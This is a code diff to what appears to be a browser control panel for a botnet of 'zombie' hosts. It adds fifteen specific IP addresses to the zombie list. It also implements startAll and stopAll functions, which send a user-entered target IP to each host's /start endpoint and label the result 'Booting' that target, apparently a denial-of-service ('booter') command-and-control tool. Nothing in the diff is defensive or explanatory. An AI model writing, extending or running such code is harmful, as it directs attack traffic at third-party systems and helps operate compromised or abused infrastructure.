@@ -58,6 +58,21 @@
 
         var zombieList = [
            "193.233.133.54",
+           "212.113.119.65",
+           "212.113.119.60",
+           "45.138.74.121",
+           "109.107.181.59",
+           "89.208.103.228",
+           "94.228.168.2",
+           "94.228.168.149",
+           "212.113.116.110",
+           "109.107.181.114",
+           "91.103.252.195",
+           "91.103.252.196",
+           "212.113.119.97",
+           "212.113.119.98",
+           "193.233.133.132",
+           "81.19.137.221"
         ];
 
         var sanityList = {
@@ -77,28 +92,65 @@
         }
 
         function startAll(){
+            var target = document.getElementById('targetIP').value;
+            var x = new Date();
+            var time = x.toTimeString().substr(0,8);
 
+            for (let i = 0; i < zombieList.length; i++) {
+                $.ajax({
+                    url: `http://${zombieList[i]}/start`, 
+                    type: "POST",
+                    contentType: "application/json; charset=utf-8",
+                    data: JSON.stringify({
+                        "id" : i,
+                        "trg" : target
+                    }),
+                    timeout: 5000,
+                    success: function (data) {
+                        var x = new Date();
+                        sanityList[zombieList[i]] = `Booting ${target} ${time}`;
+                    },
+                    error: function(err){
+                        sanityList[zombieList[i]] = "Down";
+                    },
+                });
+            }
         }
 
         function stopAll(){
-
+            for (let i = 0; i < zombieList.length; i++) {
+                $.ajax({
+                    url: `http://${zombieList[i]}/stop`, 
+                    type: "POST",
+                    contentType: "application/json; charset=utf-8",
+                    data: JSON.stringify({
+                        "id" : i
+                    }),
+                    timeout: 5000,
+                    success: function (data) {
+                        sanityList[zombieList[i]] = `Idle`;
+                    },
+                    error: function(err){
+                        sanityList[zombieList[i]] = "Down";
+                    },
+                });
+            }
         }
 
         function sanityAll(){
 
             for (let i = 0; i < zombieList.length; i++) {
-                var zombIP = zombieList[i];
                 $.ajax({
-                    url: `http://${zombIP}/sanityCheck`, 
+                    url: `http://${zombieList[i]}/sanityCheck`, 
                     type: "POST",
                     data: JSON.stringify({ 
                     }),
                     timeout: 2000,
                     success: function (data) {
-                        sanityList[zombIP] = "Idle";
+                        sanityList[zombieList[i]] = "Idle";
                     },
                     error: function(err){
-                        sanityList[zombIP] = "Down";
+                        sanityList[zombieList[i]] = "Down";
                     },
                 });
             }
